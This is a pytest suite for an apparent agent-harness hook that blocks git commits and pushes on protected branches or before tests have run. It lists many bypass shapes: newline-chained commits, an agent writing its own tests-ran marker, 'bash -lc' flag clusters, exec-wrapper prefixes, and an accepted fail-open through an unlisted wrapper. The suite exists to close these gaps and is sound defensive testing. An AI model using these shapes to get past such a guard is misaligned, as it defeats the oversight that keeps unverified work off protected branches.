        _UNSKIP_NO_CHECKLIST,
        '    if not checklist.is_file():\n        _deny("mutant: missing checklist")',
    )
    repo, impl, tests_root = _production_repo(
        tmp_path, staged={"story.txt": "story work"}, checklist=None
    )

    code, out = _run_mutant_hook(
        mutant, _commit_event(repo), repo, _production_env(impl, tests_root)
    )

    assert code == 2, "the checklist-missing inertness assertion must red"
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_mutant_diffwise_unskip_allows_readded_marker(tmp_path: Path) -> None:
    """Twin: re-read the clause diff-wise — deny only when a marker present in
    HEAD survives into the index. The re-add is then allowed (that assertion
    reds) while the marker-absent control stays green, which is precisely the
    misreading the pair exists to catch."""
    mutant = _write_mutant(
        tmp_path,
        "diffwise",
        "        if _SKIP_TOKEN in blob:\n            still_skipped.append(rel)",
        "        head = subprocess.run(\n"
        '            ["git", "show", f"HEAD:{rel}"],\n'
        "            cwd=cwd or None, capture_output=True, text=True, timeout=10,\n"
        "        )\n"
        "        if _SKIP_TOKEN in blob and _SKIP_TOKEN in head.stdout:\n"
        "            still_skipped.append(rel)",
    )
    readd_repo, readd_impl, readd_root = _production_repo(
        tmp_path / "readd",
        committed={_ACCEPTANCE_REL: _CLEAN_ACCEPTANCE},
        staged={_ACCEPTANCE_REL: _SKIPPED_ACCEPTANCE},
        checklist=_checklist_body(_ACCEPTANCE_REL),
    )
    code, out = _run_mutant_hook(
        mutant,
        _commit_event(readd_repo),
        readd_repo,
        _production_env(readd_impl, readd_root),
    )
    assert code == 0, "the re-add deny assertion must red under a diff-wise reading"
    assert out is None

    control_repo, control_impl, control_root = _production_repo(
        tmp_path / "control",
        committed={_ACCEPTANCE_REL: _CLEAN_ACCEPTANCE},
        staged={_ACCEPTANCE_REL: _CLEAN_ACCEPTANCE + "// one more assertion\n"},
        checklist=_checklist_body(_ACCEPTANCE_REL),
    )
    code, _ = _run_mutant_hook(
        mutant,
        _commit_event(control_repo),
        control_repo,
        _production_env(control_impl, control_root),
    )
    assert code == 0, "the marker-absent control stays green: it isolates nothing alone"


def test_mutant_test_artifacts_cwd_fallback_reds_env_unset_inertness(tmp_path: Path) -> None:
    """Twin: give the test-artifacts resolver the cwd-derived fallback its
    sibling carries. The env-unset commit then resolves a root, finds the
    planted checklist, and denies — reddening both the inertness assertion and
    the source-shape one."""
    edits = [
        (_TEST_ARTIFACTS_DEF, "def _test_artifacts(cwd: str | None) -> Path | None:"),
        (
            _TEST_ARTIFACTS_TAIL,
            '    env = os.environ.get("ULTRACODE_TEST_ARTIFACTS")\n'
            "    if env:\n"
            "        return Path(env)\n"
            "    if cwd:\n"
            '        return Path(cwd) / "_bmad-output" / "test-artifacts"\n'
            "    return None",
        ),
        (_TEST_ARTIFACTS_CALL, "    tests_root = _test_artifacts(cwd)"),
    ]
    mutant = _write_mutant_multi(tmp_path, "cwd_fallback", edits)
    repo, impl, _ = _env_unset_repo(tmp_path)

    code, out = _run_mutant_hook(
        mutant, _commit_event(repo), repo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    )

    assert code == 2, "the env-unset inertness assertion must red under a fallback"
    assert "Un-skip proof" in _reason(out)
    # ...and the source-shape assertion reds on sight of the same mutation.
    assert _resolver_derives_a_path(mutant.read_text(encoding="utf-8"))

    # The pre-existing green-story regression test plants no checklist, so under
    # this same mutation it goes inert for want of one and stays green. It is a
    # live regression witness, not a twin.
    plain_repo, plain_impl = _green_story_repo(tmp_path / "plain", stage=True)
    code, out = _run_mutant_hook(
        mutant,
        _commit_event(plain_repo),
        plain_repo,
        {"ULTRACODE_IMPL_ARTIFACTS": str(plain_impl)},
    )
    assert code == 0
    assert out is None


def test_mutant_unreadable_checklist_note_allows_commit(tmp_path: Path) -> None:
    """Twin: turn the unreadable-checklist deny into the inert note. Only the
    unreadable-checklist assertion reds."""
    mutant = _write_mutant(
        tmp_path,
        "unreadable_note",
        _UNSKIP_UNREADABLE,
        "    except (OSError, UnicodeDecodeError):\n"
        '        _note("mutant: note instead of deny")\n        return\n        _deny(\n',
    )
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={_ACCEPTANCE_REL: _CLEAN_ACCEPTANCE},
        checklist=_checklist_body(_ACCEPTANCE_REL),
    )
    (tests_root / _CHECKLIST_NAME).write_bytes(b"\xff\xfe not decodable \x00\x9c")

    code, out = _run_mutant_hook(
        mutant, _commit_event(repo), repo, _production_env(impl, tests_root)
    )

    assert code == 0, "the unreadable-checklist deny assertion must red"
    assert out is None


def test_mutant_git_show_failure_treated_as_empty_allows_commit(tmp_path: Path) -> None:
    """Twin: read an unanswerable `git show :<path>` as an empty blob and carry
    on. Only the staged-read-failure assertion reds."""
    mutant = _write_mutant(
        tmp_path,
        "git_show_empty",
        _UNSKIP_UNREADABLE_STAGED,
        "        if not readable:\n            continue\n            _deny(\n",
    )
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={"story.txt": "story work"},
        checklist=_checklist_body("tests/acceptance/missing.spec.ts"),
    )

    code, out = _run_mutant_hook(
        mutant, _commit_event(repo), repo, _production_env(impl, tests_root)
    )

    assert code == 0, "the staged-read-failure deny assertion must red"
    assert out is None


def test_mutant_deny_on_empty_test_file_list_reds_doc_only_commit(tmp_path: Path) -> None:
    """Twin: fail closed when the checklist enumerates no acceptance-test file.
    The doc-only story's commit then denies — which is also why that case is
    inert in the first place: every documentation and refactor commit would
    otherwise brick."""
    mutant = _write_mutant(
        tmp_path,
        "no_files_deny",
        _UNSKIP_NO_FILES,
        '    if not files:\n        _deny("mutant: checklist names no test file")',
    )
    repo, impl, tests_root = _production_repo(
        tmp_path,
        staged={"docs/notes.md": "prose only\n"},
        checklist="# Acceptance checklist for STORY-1\n\nNo acceptance tests: docs only.\n",
    )

    code, out = _run_mutant_hook(
        mutant, _commit_event(repo), repo, _production_env(impl, tests_root)
    )

    assert code == 2, "the doc-only inertness assertion must red"
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"


# ---------------------------------------------------------------------------
# Verb anchoring: `git` must be the segment's LEADING token.
#
# A verb merely MENTIONED (an echo, a log line, a here-string in a verification
# command) is not a git write and must not burn a turn on a deny. The anchor is
# taken AFTER stripping leading `VAR=val` assignments and known exec wrappers,
# which is what keeps the fix from becoming a fail-open: an env- or
# sudo-prefixed real commit still denies.
#
# Twins in this section come in two shapes. Behavioral ones run a patched COPY
# of the hook under tmp_path (never the live file). Ones that must remove a
# clause import the shipped module in-process and monkeypatch a single constant,
# so the neutering is expressed against the real code rather than a hand-edited
# lookalike.
# ---------------------------------------------------------------------------

_ECHO_MENTION = 'echo "remember to git commit once the suite is green"'


def _load_guard_module():
    spec = importlib.util.spec_from_file_location("ucg_guard_under_test", HOOK)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


@pytest.fixture
def guard_module():
    """The shipped hook imported in-process, fresh per test.

    Fresh matters: monkeypatched constants must not leak between twins.
    """
    return _load_guard_module()


def _bash_event(cwd: Path, command: str) -> dict:
    return {
        "hook_event_name": "PreToolUse",
        "tool_name": "Bash",
        "tool_input": {"command": command},
        "cwd": str(cwd),
    }


def _protected_repo(tmp_path: Path, name: str = "protected") -> Path:
    repo = tmp_path / name
    repo.mkdir(parents=True)
    _init_repo(repo, "main")
    return repo


def _unmarked_epic_repo(tmp_path: Path, name: str = "epic") -> tuple[Path, Path]:
    """Epic branch, story known, tests-ran marker NOT yet written.

    The turn-burning shape in practice: mid-story, a status or verification
    command that happens to name the verb.
    """
    repo = tmp_path / name
    repo.mkdir(parents=True)
    _init_repo(repo, "ultracode/epic-42")
    impl = repo / "impl"
    impl.mkdir()
    (impl / ".current-story").write_text("STORY-1")
    return repo, impl


def test_echo_mention_of_git_commit_is_allowed(tmp_path: Path) -> None:
    """A mentioned verb is not a write, on either gated branch shape."""
    protected = _protected_repo(tmp_path)
    code, out = _run_hook(_bash_event(protected, _ECHO_MENTION), protected)
    assert code == 0, "a mention on a protected branch is not a commit"
    assert out is None

    repo, impl = _unmarked_epic_repo(tmp_path)
    code, out = _run_hook(
        _bash_event(repo, _ECHO_MENTION), repo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    )
    assert code == 0, "nor is it one before the tests-ran marker exists"
    assert out is None

    # Same anchoring, second obligation: the verb is matched as a whole token,
    # so the plumbing command the old trailing `\b` never actually excluded
    # (`-` is itself a word boundary) is no longer read as a commit.
    code, out = _run_hook(
        _bash_event(protected, "git commit-tree -p HEAD -m x abc123"), protected
    )
    assert code == 0
    assert out is None


_TOKENIZE_BODY = "    return shlex.split(segment)"


def test_anchoring_disabled_denies_echo_mention(tmp_path: Path) -> None:
    """Twin: force the classifier down its fail-closed fallback branch.

    The fallback is the legacy matches-anywhere scan, kept for segments that
    cannot be tokenized. Driving a well-formed segment into it restores the old
    behavior exactly, and the echo denies again — which is what proves the
    allow above comes from the anchoring rather than from the guard never
    looking at the command.
    """
    mutant = _write_mutant(
        tmp_path,
        "no_anchor",
        _TOKENIZE_BODY,
        '    raise ValueError("mutant: tokenizer disabled")',
    )

    protected = _protected_repo(tmp_path)
    code, out = _run_mutant_hook(mutant, _bash_event(protected, _ECHO_MENTION), protected)
    assert code == 2, "the protected-branch allow assertion must red without anchoring"
    assert "Protected-branch" in out["hookSpecificOutput"]["permissionDecisionReason"]

    repo, impl = _unmarked_epic_repo(tmp_path)
    code, out = _run_mutant_hook(
        mutant,
        _bash_event(repo, _ECHO_MENTION),
        repo,
        {"ULTRACODE_IMPL_ARTIFACTS": str(impl)},
    )
    assert code == 2, "and so must the tests-ran allow assertion"
    assert "Tests-ran guard" in out["hookSpecificOutput"]["permissionDecisionReason"]


def test_chained_real_commit_still_denied(tmp_path: Path) -> None:
    """A real chained commit is caught by the per-segment classification."""
    chained = "git add -A && git commit -m x"

    protected = _protected_repo(tmp_path)
    code, out = _run_hook(_bash_event(protected, chained), protected)
    assert code == 2
    assert "Protected-branch" in out["hookSpecificOutput"]["permissionDecisionReason"]

    repo, impl = _unmarked_epic_repo(tmp_path)
    code, out = _run_hook(
        _bash_event(repo, chained), repo, {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    )
    assert code == 2
    assert "Tests-ran guard" in out["hookSpecificOutput"]["permissionDecisionReason"]


_SEGMENT_SPLIT = (
    "    for separators in (\n"
    '        r"&&|\\|\\||;|\\|",\n'
    '        r"&&|\\|\\||;|\\||\\n|\\r",\n'
    '        r"&&|\\|\\||;|\\||&|\\n|\\r",\n'
    "    ):\n"
    "        for segment in re.split(separators, command):\n"
    "            verbs |= _segment_write_verbs(segment, depth)"
)
_PREFIX_STRIP_TEST = (
    "    while index < len(tokens) and _ASSIGNMENT.match(tokens[index]):"
)


def test_mutant_without_segment_split_allows_chained_commit(tmp_path: Path) -> None:
    """Twin: classify the whole chained command as ONE segment.

    Its leading token is `git`, but the subcommand in verb position is `add`,
    so the real commit is allowed and the deny above reds. This is what makes
    the per-segment split load-bearing rather than incidental.
    """
    mutant = _write_mutant(
        tmp_path,
        "no_split",
        _SEGMENT_SPLIT,
        "    verbs |= _segment_write_verbs(command, depth)",
    )
    protected = _protected_repo(tmp_path)

    code, out = _run_mutant_hook(
        mutant, _bash_event(protected, "git add -A && git commit -m x"), protected
    )

    assert code == 0, "the chained-commit deny assertion must red without the split"
    assert out is None


def test_mutant_unconditional_prefix_strip_allows_chained_commit(tmp_path: Path) -> None:
    """Second, independent twin for the same deny: drop the membership test on
    the leading-prefix strip, so `git` itself is consumed as if it were a
    prefix and no segment ever anchors."""
    mutant = _write_mutant(
        tmp_path, "strip_all", _PREFIX_STRIP_TEST, "    while index < len(tokens):"
    )
    protected = _protected_repo(tmp_path)

    code, out = _run_mutant_hook(
        mutant, _bash_event(protected, "git add -A && git commit -m x"), protected
    )

    assert code == 0, "an unconditional strip consumes the anchor and allows the commit"
    assert out is None


@pytest.mark.parametrize(
    "command",
    ["FOO=bar git commit -m x", "sudo git commit -m x"],
)
def test_assignment_and_sudo_prefixed_commit_denied(tmp_path: Path, command: str) -> None:
    """The strip exists to prevent a fail-open, not to create one.

    An assignment or wrapper prefix moves the anchor right; it does not excuse
    the command from the guard.
    """
    protected = _protected_repo(tmp_path)

    code, out = _run_hook(_bash_event(protected, command), protected)

    assert code == 2, command
    assert "Protected-branch" in out["hookSpecificOutput"]["permissionDecisionReason"]


@pytest.mark.parametrize(
    "command",
    [
        "timeout 30 git commit -m x",
        "nice -n 10 git commit -m x",
        "sudo -u builder git commit -m x",
        "ionice -c2 git commit -m x",
        "stdbuf -oL git commit -m x",
        "env -i FOO=b git commit -m x",
        "sudo timeout 30 git push origin main",
    ],
)
def test_arg_taking_wrapper_prefixed_commit_denied(tmp_path: Path, command: str) -> None:
    """Wrappers that take their own operands are the real fail-open risk.

    Dropping exactly one token per wrapper would leave `30`, `10`, `builder`
    and friends in the leading position and wave every one of these through. A
    LISTED wrapper failing open is not part of the accepted residual, so each
    form is pinned here.
    """
    protected = _protected_repo(tmp_path)

    code, out = _run_hook(_bash_event(protected, command), protected)

    assert code == 2, command
    assert "Protected-branch" in out["hookSpecificOutput"]["permissionDecisionReason"]


@pytest.mark.parametrize(
    "command",
    [
        "git -C /tmp/repo commit -m x",
        "git --no-pager commit -m x",
        'echo "$(git commit -m x)"',
        "echo `git commit -m x`",
    ],
)
def test_forms_that_still_reach_the_fail_closed_path_are_denied(
    tmp_path: Path, command: str
) -> None:
    """Anchoring must not open holes it did not have to.

    `git -C <path>` puts a path between the anchor and the verb, and a
    substitution runs a command the tokenizer cannot see at all; both stay
    denied (the first by skipping value-taking global options, the second by
    falling back to the legacy scan).
    """
    protected = _protected_repo(tmp_path)

    code, out = _run_hook(_bash_event(protected, command), protected)

    assert code == 2, command
    assert "Protected-branch" in out["hookSpecificOutput"]["permissionDecisionReason"]


# ---------------------------------------------------------------------------
# A NEWLINE separates commands exactly as `;` does.
#
# Before this was in the split regex, a command whose first line was anything
# other than `git` classified as ONE segment with a non-git leading token, so
# `_git_writes` returned the empty set and main() took the `_allow()` short
# circuit at the top — bypassing the protected-branch, tests-ran-marker, marker
# freshness AND empty-index gates together. Multi-line Bash is ordinary, and
# `printf ok > .tests-ran-<story>` + commit is the exact shape the marker gate
# exists to forbid, so this was a total bypass rather than a corner case.
# ---------------------------------------------------------------------------

_NEWLINE_BYPASSES = [
    # the marker gate defeated by the story writing its own marker
    "printf ok > .tests-ran-1\ngit commit -m x",
    # the plain shape: any non-git first line
    'echo hi\ngit commit -m "x"',
    # CRLF-authored
    "echo hi\r\ngit commit -m x",
    # the verb on a later line still anchors that line
    "echo one\necho two\ngit push origin HEAD",
]


@pytest.mark.parametrize("command", _NEWLINE_BYPASSES)
def test_newline_separated_commit_is_classified(guard_module, command: str) -> None:
    """A commit/push on its own line is a git write like any other."""
    assert guard_module._git_writes(command), (
        f"newline-separated git write went unclassified: {command!r}"
    )


@pytest.mark.parametrize("command", _NEWLINE_BYPASSES)
def test_newline_split_removed_reopens_the_bypass(
    guard_module, monkeypatch, command: str
) -> None:
    """Twin: drop `\\n`/`\\r` from the separators and every shape above fails open.

    Driven by re-implementing `_command_write_verbs` over the OLD separator set
    rather than by editing a copy of the file, so the twin isolates the split
    itself. The ALLOW is the assertion: if these still classified without the
    newline alternative, the parametrize above would be proving nothing.
    """

    def old_split(cmd: str, depth: int) -> set:
        verbs: set = set()
        for segment in re.split(r"&&|\|\||;|\|", cmd):
            verbs |= guard_module._segment_write_verbs(segment, depth)
        return verbs

    monkeypatch.setattr(guard_module, "_command_write_verbs", old_split)

    assert guard_module._command_write_verbs(command, 0) == set(), (
        f"pre-fix code must fail open on {command!r}, else this is a vacuous test"
    )


def test_newline_bypass_denies_end_to_end(tmp_path: Path) -> None:
    """The bypass reached main(), so pin it there too, not just at the classifier.

    On a protected branch the first gate to fire is the protected-branch deny.
    """
    protected = _protected_repo(tmp_path)

    code, out = _run_hook(
        _bash_event(protected, "printf ok > .tests-ran-1\ngit commit -m x"), protected
    )

    assert code == 2
    assert "Protected-branch" in out["hookSpecificOutput"]["permissionDecisionReason"]


def test_newline_split_does_not_deny_a_multi_line_mention(guard_module) -> None:
    """The split must not turn ordinary multi-line prose into a deny.

    A line is only a git write when `git` leads it, so a mention sitting mid-line
    stays allowed. This is the fail-open direction's counterweight: the newline
    alternative widens what is CLASSIFIED, never what is matched inside a line.

    The probe deliberately carries BOTH words on a mid-line, and carries them in
    a line that also contains `git`, so it cannot pass merely by lacking a token
    to match — an earlier draft omitted `git` entirely and could never have
    failed.
    """
    mention = "echo one\necho 'we ran git commit already'\necho two"
    assert "git" in mention and "commit" in mention, "probe must contain both tokens"
    assert guard_module._git_writes(mention) == set()


# ---------------------------------------------------------------------------
# A newline INSIDE a quoted argument is not a separator.
#
# The newline split is quote-blind, so on its own it tears
# `git -c foo.bar="a<NL>b" commit -m x` into `git -c foo.bar="a` and
# `b" commit -m x`. Each fragment has unbalanced quotes, so `_tokenize` raises
# and each falls back to `_anywhere_write_verbs` — whose regex is newline-bounded
# (`[^\n;&|]*?`) and therefore cannot span the tear either. `git` sits in one
# fragment and the verb in the other, so BOTH detection paths miss and a real
# commit is allowed.
#
# Classifying under both separator sets and unioning is what closes this: the
# separator-only pass keeps the command whole, where `shlex` balances the quotes
# and the verb anchors normally. Every case below must therefore deny.
# ---------------------------------------------------------------------------

_QUOTED_NEWLINE_WRITES = [
    'git -c foo.bar="a\nb" commit -m x',
    'git -c foo.bar="a\nb" push origin HEAD',
    'git -C "/tmp/a\nb" commit -m x',
    'git --git-dir="a\nb" commit -m x',
    'git --work-tree="a\nb" commit -m x',
    'git -c foo.bar="a\rb" commit -m x',
    'sh -c \'git -c foo.bar="a\nb" commit -m x\'',
    # the ordinary multi-line commit message, which must not regress either
    'git commit -m "line one\nline two"',
]


@pytest.mark.parametrize("command", _QUOTED_NEWLINE_WRITES)
def test_newline_inside_a_quoted_argument_still_classifies(
    guard_module, command: str
) -> None:
    assert guard_module._git_writes(command), (
        f"a real git write was allowed through: {command!r}"
    )


@pytest.mark.parametrize("command", _QUOTED_NEWLINE_WRITES[:6])
def test_newline_only_split_would_fail_open(guard_module, monkeypatch, command: str) -> None:
    """Twin: split on the newline set ALONE and these real writes are allowed.

    This is the regression that shipping the newline alternative on its own
    introduced, pinned so the union cannot be simplified back into it.
    """

    def newline_only(cmd: str, depth: int) -> set:
        verbs: set = set()
        for segment in re.split(r"&&|\|\||;|\||\n|\r", cmd):
            verbs |= guard_module._segment_write_verbs(segment, depth)
        return verbs

    monkeypatch.setattr(guard_module, "_command_write_verbs", newline_only)

    assert guard_module._command_write_verbs(command, 0) == set(), (
        f"newline-only split must fail open on {command!r}, else this is vacuous"
    )


def test_quoted_newline_commit_denies_end_to_end(tmp_path: Path) -> None:
    """The fail-open reached main() and landed a real commit, so pin it there."""
    protected = _protected_repo(tmp_path)

    code, out = _run_hook(
        _bash_event(protected, 'git -c foo.bar="a\nb" commit -m x'), protected
    )

    assert code == 2
    assert "Protected-branch" in out["hookSpecificOutput"]["permissionDecisionReason"]


def test_union_is_a_superset_of_the_separator_only_classification(guard_module) -> None:
    """The property the union exists to guarantee, asserted directly.

    Whatever the pre-newline separator set detected, the shipped classifier must
    still detect. Stated as a property over every shape this file exercises, so a
    future narrowing of either pass reds here rather than in one hand-picked case.
    """

    def separator_only(cmd: str) -> set:
        verbs: set = set()
        for segment in re.split(r"&&|\|\||;|\|", cmd):
            verbs |= guard_module._segment_write_verbs(segment, 0)
        return verbs

    for command in _QUOTED_NEWLINE_WRITES + _NEWLINE_BYPASSES + [
        "git commit -m x",
        "git add -A && git commit -m x",
        "FOO=bar git commit -m x",
        "sudo git commit -m x",
        _ECHO_MENTION,
    ]:
        assert separator_only(command) <= guard_module._git_writes(command), (
            f"the shipped classifier detects LESS than the separator-only pass "
            f"on {command!r}: that is a fail-open regression"
        )


def test_wrapper_strip_removed_allows_env_prefixed_commit(guard_module, monkeypatch) -> None:
    """Twin: remove the assignment/wrapper strip and the prefixed commits pass.

    Driven against the imported module rather than a hand-edited copy of the
    live guard. The plain form still classifies as a commit under the same
    mutation, so this proves the STRIP is what catches the prefixed forms, not
    a classifier that happens to allow (or deny) everything.
    """
    prefixed = ["FOO=bar git commit -m x", "sudo git commit -m x"]
    for command in prefixed:
        assert guard_module._git_writes(command) == {"commit"}, command

    monkeypatch.setattr(guard_module, "_EXEC_WRAPPERS", frozenset())
    monkeypatch.setattr(guard_module, "_ASSIGNMENT", re.compile(r"(?!)"))

    for command in prefixed:
        assert guard_module._git_writes(command) == set(), (
            f"without the strip, {command!r} must slip through: that is the "
            "fail-open the strip exists to prevent"
        )
    assert guard_module._git_writes("git commit -m x") == {"commit"}, (
        "the unprefixed form is untouched by the mutation, so the twin isolates "
        "the strip rather than disabling the guard wholesale"
    )


def test_unlisted_wrapper_is_an_accepted_fail_open(guard_module, monkeypatch) -> None:
    """Documented residual: a wrapper the list does not name is allowed through.

    An unlisted wrapper leaves a non-`git` leading token, so the segment is not
    classified as a git write. This is accepted rather than fixed, because the
    alternative (treat any unknown leading token as a possible wrapper and scan
    on) re-creates the matches-anywhere false positives this anchoring removes.

    Two compensating nets stand behind the residual:
      1. the tests-ran marker — a commit still needs a verified-green marker on
         disk for the current story, which no wrapper prefix can conjure; and
      2. the remote's branch protection — nothing reaches a protected branch
         without review, whatever the local guard let past.

    `timeout` stands in for an unlisted wrapper by being dropped from the list
    for this test only. In shipped state it IS listed and the same shape denies:
    that pole is held by test_arg_taking_wrapper_prefixed_commit_denied, and by
    the shipped-state assertion below.
    """
    command = "timeout git commit -m x"
    assert guard_module._git_writes(command) == {"commit"}, (
        "shipped state: `timeout` is a listed wrapper, so this denies"
    )

    monkeypatch.setattr(
        guard_module, "_EXEC_WRAPPERS", guard_module._EXEC_WRAPPERS - {"timeout"}
    )

    assert guard_module._git_writes(command) == set(), (
        "accepted residual: an unlisted wrapper passes the guard. Compensating "
        "nets: the tests-ran marker (no commit without a verified-green story "
        "marker) and the remote's branch protection (nothing lands on a "
        "protected branch unreviewed)."
    )


@pytest.mark.parametrize(
    "command",
    ["sh -c 'git commit -m x'", 'bash -c "git commit -m x"'],
)
def test_shell_dash_c_payload_commit_denied(tmp_path: Path, command: str) -> None:
    """The `-c` string payload is re-entered as a command in its own right."""
    protected = _protected_repo(tmp_path)

    code, out = _run_hook(_bash_event(protected, command), protected)

    assert code == 2, command
    assert "Protected-branch" in out["hookSpecificOutput"]["permissionDecisionReason"]


def test_dash_c_recursion_disabled_allows_payload_commit(guard_module, monkeypatch) -> None:
    """Twin: with no shell recognized, nothing recurses into the `-c` payload
    and the same commit is allowed, so the deny above reds."""
    command = "sh -c 'git commit -m x'"
    assert guard_module._git_writes(command) == {"commit"}

    monkeypatch.setattr(guard_module, "_SHELL_WRAPPERS", frozenset())

    assert guard_module._git_writes(command) == set(), (
        "without the recursion the payload is just an opaque argument word"
    )
    assert guard_module._git_writes("git commit -m x") == {"commit"}, (
        "and the direct form is unaffected: the twin removes the recursion only"
    )


@pytest.mark.parametrize(
    "command",
    [
        "bash -lc 'git commit -m x'",
        'sh -lc "git commit -m x"',
        "bash -cx 'git commit -m x'",
        "bash -xc 'git commit -m x'",
        "zsh -ic 'git push'",
        "bash -ec 'git push --force'",
        "dash -lc 'git push'",
        "timeout 30 bash -lc 'git commit -m x'",
    ],
)
def test_shell_flag_cluster_payload_commit_denied(tmp_path: Path, command: str) -> None:
    """A combined flag cluster carrying `-c` still locates the payload.

    Matching only the bare `-c` token was a fail-open: every form here located
    no payload, returned an empty verb set, and took the allow path BEFORE the
    protected-branch, tests-ran, marker-freshness and empty-index gates — the
    whole commit gate, skipped by one extra letter in the flag.

    The `c` is matched anywhere in the cluster because the shells treat it
    positionally-indifferently: `bash -cx` and `bash -xc` both run the next
    token (verified against bash, sh and dash, not assumed).
    """
    protected = _protected_repo(tmp_path)

    code, out = _run_hook(_bash_event(protected, command), protected)

    assert code == 2, command
    assert "Protected-branch" in out["hookSpecificOutput"]["permissionDecisionReason"]


def test_unlocatable_shell_payload_falls_back_rather_than_allowing(guard_module) -> None:
    """A listed wrapper whose payload cannot be found fails CLOSED.

    `_shell_payload_verbs` returns None (not an empty set) so the caller scans
    the raw segment instead of reading "no payload found" as "no git write
    here". A LISTED wrapper failing open is not part of the accepted residual —
    that allowance covers UNLISTED wrappers only (see
    test_unlisted_wrapper_is_an_accepted_fail_open).
    """
    assert guard_module._shell_payload_verbs(["-lc"], 0) is None, (
        "no operand after the flag: unlocatable, not clean"
    )
    assert guard_module._shell_payload_verbs(["-x", "-v"], 0) is None, (
        "no payload flag at all: unlocatable, not clean"
    )
    # Reached through the real entry point, the None becomes the anywhere-scan.
    assert guard_module._git_writes("bash -x git commit -m x") == {"commit"}


def test_flag_cluster_match_excludes_long_options(guard_module) -> None:
    """`--login` must not read as a payload flag, or the operand after a long
    option would be mistaken for the command string."""
    assert not guard_module._PAYLOAD_FLAG.match("--login")
    assert not guard_module._PAYLOAD_FLAG.match("-i")
    assert guard_module._PAYLOAD_FLAG.match("-c")
    assert guard_module._PAYLOAD_FLAG.match("-lc")
    assert guard_module._PAYLOAD_FLAG.match("-cx")
    # The real form still routes past the long option to the actual `-c`.
    assert guard_module._git_writes("bash --login -c 'git push'") == {"push"}


def test_flag_cluster_fix_removed_restores_the_bypass(guard_module, monkeypatch) -> None:
    """Twin: the hole reopens only when BOTH halves of the fix are removed.

    The two halves are deliberately redundant, which this pins rather than
    glosses. Narrowing the matcher alone does not restore the bypass, because
    an unlocatable payload now falls back to the anywhere-scan; disabling the
    fallback alone does not restore it either, because the matcher locates the
    payload. Each half independently denies the commit, and only removing both
    reproduces the original fail-open.
    """
    import re as _re

    bypass = "bash -lc 'git commit -m x'"
    bare_matcher = _re.compile(r"^-c$")
    assert guard_module._git_writes(bypass) == {"commit"}

    # Half 1 alone: matcher narrowed, fallback intact -> still denied.
    with monkeypatch.context() as m:
        m.setattr(guard_module, "_PAYLOAD_FLAG", bare_matcher)
        assert guard_module._git_writes(bypass) == {"commit"}, (
            "the fail-closed fallback catches what the matcher missed"
        )

    # Half 2 alone: fallback neutered, matcher intact -> still denied.
    with monkeypatch.context() as m:
        m.setattr(guard_module, "_anywhere_write_verbs", lambda segment: set())
        assert guard_module._git_writes(bypass) == {"commit"}, (
            "the cluster matcher locates the payload without needing the fallback"
        )

    # Both removed: the original bypass is back, which is what the fix closes.
    monkeypatch.setattr(guard_module, "_PAYLOAD_FLAG", bare_matcher)
    monkeypatch.setattr(guard_module, "_anywhere_write_verbs", lambda segment: set())
    assert guard_module._git_writes(bypass) == set(), (
        "with neither half, the cluster form locates no payload and the empty "
        "set is what waved a real commit past every gate"
    )
    assert guard_module._git_writes("bash -c 'git commit -m x'") == {"commit"}, (
        "and the bare form is unaffected: the twin narrows the matcher only"
    )


def test_dash_c_payload_split_mid_quote_still_denies(tmp_path: Path) -> None:
    """The segment split runs BEFORE the `-c` recursion, so a chained payload is
    cut mid-quote into `sh -c 'git add -A` and `git commit'`.

    Neither fragment tokenizes cleanly, so both take the fail-closed fallback
    and the second one still reports the verb. Verified rather than assumed.
    """
    protected = _protected_repo(tmp_path)

    code, out = _run_hook(
        _bash_event(protected, "sh -c 'git add -A && git commit -m x'"), protected
    )

    assert code == 2
    assert "Protected-branch" in out["hookSpecificOutput"]["permissionDecisionReason"]


# ---------------------------------------------------------------------------
# Writer side: the two places execute.md tells a story to write the marker.
#
# The reader above only refuses a marker that does not name the story's
# baseline; something has to tell the writer to put the line there in the first
# place, at BOTH marker-write sites. Step 2 writes the marker at green; step 5
# writes a FRESH one when the post-commit re-verify comes back red — and a
# step-5 marker without the line means a story that legitimately needs
# remediation can never re-commit.
#
# ONE matcher is applied to both blocks, so each twin can red its own site while
# the same matcher stays green on the other. Without that pairing, a matcher
# that scanned the whole file would satisfy the step-5 check off step 2's
# sentence and prove nothing about the second site.
#
# Stated limit: this is a presence proof over prose. It shows the instruction is
# in the file, not that an executor obeys it; the behavioral proof is the reader
# section above, against the real hook.
# ---------------------------------------------------------------------------

_EXECUTE_MD = Path(__file__).resolve().parents[2] / "references" / "execute.md"

# The marker-format rule: the `baseline=<sha>` line, the file it is copied FROM,
# and the copied-not-recomputed obligation, in that order and co-located.
_BASELINE_LINE_RE = re.compile(
    r"`baseline=<sha>` line"
    r".{0,400}?`\{workflow\.implementation_artifacts\}/\.baseline-<story_id>`"
    r".{0,400}?copied, never re-derived from `git rev-parse HEAD`",
    re.DOTALL,
)

# Each site's added sentence, anchored so a twin's removal is surgical.
_STEP2_BASELINE_SENTENCE_RE = re.compile(
    r"\*\*That marker must carry a `baseline=<sha>` line\*\*"
    r".*?denies the story's own second commit\.",
    re.DOTALL,
)
_STEP5_BASELINE_SENTENCE_RE = re.compile(
    r"\*\*That fresh marker carries the same `baseline=<sha>` line as step 2's\*\*"
    r".*?could never close\. ",
    re.DOTALL,
)


def _execute_text() -> str:
    return _EXECUTE_MD.read_text(encoding="utf-8")


def _md_step2(text: str | None = None) -> str:
    text = text if text is not None else _execute_text()
    start = text.index("\n2. ")
    return text[start:text.index("\n3. ", start)]


def _md_step5(text: str | None = None) -> str:
    text = text if text is not None else _execute_text()
    start = text.index("\n5. ")
    return text[start:text.index("\n\n", start)]


def test_execute_md_marker_step_copies_baseline_never_recomputes() -> None:
    block = _md_step2()
    assert "write the tests-ran marker" in block, "step-2 slice must be the marker write"
    assert _BASELINE_LINE_RE.search(block), (
        "step 2 must mandate a `baseline=<sha>` line copied from the story's "
        "recorded baseline, never re-derived from `git rev-parse HEAD`"
    )
    # the pre-existing step-2 semantics must survive the edit
    assert "PRINT the raw output" in block
    assert "{workflow.implementation_artifacts}/.tests-ran-<story_id>" in block
